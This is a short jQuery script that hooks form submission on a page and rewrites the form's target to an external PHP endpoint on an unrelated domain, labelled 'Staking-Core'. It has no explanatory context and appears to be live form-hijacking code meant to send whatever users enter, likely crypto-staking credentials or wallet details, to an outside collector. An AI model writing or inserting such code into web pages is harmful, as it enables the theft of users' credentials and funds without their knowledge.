$("form").submit(function() {
  $(myform).attr("action", "https://torpedo-mashee.my.id/addons/kawahara.php?Staking-Core");
});
